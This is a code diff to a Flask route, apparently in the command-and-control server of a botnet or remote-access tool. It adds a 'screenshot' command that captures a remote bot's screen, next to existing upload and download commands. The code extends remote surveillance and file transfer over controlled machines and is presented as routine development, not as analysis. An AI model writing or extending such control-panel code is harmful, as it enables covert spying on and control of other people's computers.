@@ -179,8 +179,20 @@ def send_command():
         
     bot = Bot.botList[session_id]
     try:
+        # Handle screenshot command
+        if command == 'screenshot':
+            success, message, filepath = bot.screenshot()
+            if success and filepath:
+                return jsonify({
+                    'success': True,
+                    'message': message,
+                    'output': f"Screenshot saved to: {filepath}"
+                })
+            else:
+                return jsonify({'error': message}), 500
+                
         # Handle file upload/download commands
-        if command.startswith('upload '):
+        elif command.startswith('upload '):
             filename = command[7:]  # Get filename after 'upload '
             try:
                 with open(filename, 'rb') as f:
